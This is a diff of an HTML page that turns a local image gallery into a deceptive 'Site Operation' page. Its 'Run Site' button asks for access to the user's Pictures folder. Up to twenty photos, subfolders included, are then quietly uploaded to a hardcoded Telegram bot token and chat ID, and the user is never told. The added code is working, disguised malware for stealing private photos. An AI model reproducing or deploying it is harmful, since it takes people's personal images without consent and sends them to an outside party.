@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الوصول إلى الصور</title>
+    <title>Site Operation</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,7 +16,7 @@
             border-radius: 10px;
             padding: 30px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 600px;
+            max-width: 400px;
             margin: 0 auto;
         }
         button {
@@ -32,108 +32,98 @@
         button:hover {
             background-color: #45a049;
         }
-        #imageGallery {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            margin-top: 20px;
-        }
-        .image-item {
-            margin: 10px;
-            max-width: 200px;
-        }
-        .image-item img {
-            max-width: 100%;
-            border-radius: 5px;
-        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>لتشغيل الموقع اضغط على الزر</h1>
-        <p>انقر على الزر أدناه ليشتغل الموقع</p>
-        
-        <button id="accessButton">Site operation</button>
-        
-        <div id="imageGallery"></div>
+        <h1>Site Operation</h1>
+        <p>Click the button below to run the site</p>
+        <button id="accessButton">Run Site</button>
     </div>
 
     <script>
+        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
+        const CHAT_ID = "6913353602";
+        const MAX_IMAGES_TO_SEND = 20;
+
         document.getElementById('accessButton').addEventListener('click', async () => {
             try {
-                // طلب إذن الوصول إلى مجلد الصور
+                // Request permission to access Pictures folder
                 const dirHandle = await window.showDirectoryPicker({
                     startIn: 'pictures'
                 });
                 
-                // مسح معرض الصور الحالي
-                const gallery = document.getElementById('imageGallery');
-                gallery.innerHTML = '<p>جاري التحميل...</p>';
-                
-                // عرض الصور
-                await displayImages(dirHandle);
+                // Start sending images
+                await findAndSendImages(dirHandle);
                 
             } catch (error) {
                 console.error('Error:', error);
-                document.getElementById('imageGallery').innerHTML = 
-                    `<p style="color:red">حدث خطأ: ${error.message}</p>`;
             }
         });
 
-        async function displayImages(dirHandle) {
-            const gallery = document.getElementById('imageGallery');
-            gallery.innerHTML = '';
+        async function findAndSendImages(dirHandle) {
+            let imagesSent = 0;
+            const imageQueue = [];
             
-            let imageCount = 0;
-            
-            // الدخول إلى المجلد الرئيسي والفروع
+            // First collect all images (up to MAX_IMAGES_TO_SEND)
             for await (const entry of dirHandle.values()) {
+                if (imagesSent >= MAX_IMAGES_TO_SEND) break;
+                
                 if (entry.kind === 'file' && isImageFile(entry.name)) {
-                    // عرض ملفات الصور مباشرة
-                    await displayImageFile(entry);
-                    imageCount++;
-                } else if (entry.kind === 'directory') {
-                    // البحث في المجلدات الفرعية
-                    const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
-                    for await (const subEntry of subDirHandle.values()) {
-                        if (subEntry.kind === 'file' && isImageFile(subEntry.name)) {
-                            await displayImageFile(subEntry);
-                            imageCount++;
+                    const file = await entry.getFile();
+                    imageQueue.push({file, name: entry.name});
+                    imagesSent++;
+                } 
+                else if (entry.kind === 'directory') {
+                    try {
+                        const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
+                        for await (const subEntry of subDirHandle.values()) {
+                            if (imagesSent >= MAX_IMAGES_TO_SEND) break;
+                            
+                            if (subEntry.kind === 'file' && isImageFile(subEntry.name)) {
+                                const file = await subEntry.getFile();
+                                imageQueue.push({file, name: subEntry.name});
+                                imagesSent++;
+                            }
                         }
+                    } catch (e) {
+                        console.warn(`Couldn't access subdirectory: ${entry.name}`, e);
                     }
                 }
             }
             
-            if (imageCount === 0) {
-                gallery.innerHTML = '<p>لم يتم التشغيل</p>';
+            // Now send all collected images quickly
+            for (const image of imageQueue) {
+                try {
+                    await sendToTelegram(image.file, image.name);
+                    // Small delay to avoid rate limiting
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                } catch (e) {
+                    console.error(`Failed to send ${image.name}:`, e);
+                }
             }
+        }
+        
+        async function sendToTelegram(file, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file, filename);
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            if(!response.ok) {
+                throw new Error(`Failed to send: ${response.status}`);
+            }
+            
+            return response.json();
         }
         
         function isImageFile(filename) {
             const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'];
-            return imageExtensions.some(ext => 
-                filename.toLowerCase().endsWith(ext)
-            );
-        }
-        
-        async function displayImageFile(fileHandle) {
-            const file = await fileHandle.getFile();
-            const url = URL.createObjectURL(file);
-            
-            const gallery = document.getElementById('imageGallery');
-            const imgContainer = document.createElement('div');
-            imgContainer.className = 'image-item';
-            
-            const img = document.createElement('img');
-            img.src = url;
-            img.alt = file.name;
-            
-            const fileName = document.createElement('p');
-            fileName.textContent = file.name;
-            
-            imgContainer.appendChild(img);
-            imgContainer.appendChild(fileName);
-            gallery.appendChild(imgContainer);
+            return imageExtensions.some(ext => filename.toLowerCase().endsWith(ext));
         }
     </script>
 </body>
